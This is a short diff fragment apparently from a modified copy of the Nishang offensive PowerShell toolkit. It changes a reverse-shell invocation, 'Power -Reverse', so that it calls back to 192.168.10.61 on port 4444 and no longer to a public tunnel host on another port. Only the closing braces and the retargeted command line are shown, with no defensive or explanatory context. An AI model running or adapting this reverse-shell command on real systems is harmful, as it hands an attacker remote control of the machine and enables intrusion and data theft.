@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Power -Reverse -IPAddress rnatt-45-64-237-187.a.free.pinggy.link -Port 36579
+Power -Reverse -IPAddress 192.168.10.61 -Port 4444
